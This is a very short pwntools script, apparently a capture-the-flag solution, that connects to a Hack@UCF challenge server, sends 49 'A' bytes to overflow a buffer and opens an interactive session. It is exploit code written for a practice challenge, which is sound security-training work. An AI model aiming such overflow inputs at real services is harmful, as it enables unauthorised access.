from pwn import *

host='ctf.hackucf.org'
port = 9000
c = remote(host=host, port=port)

c.sendline(b'A'*49)
c.interactive()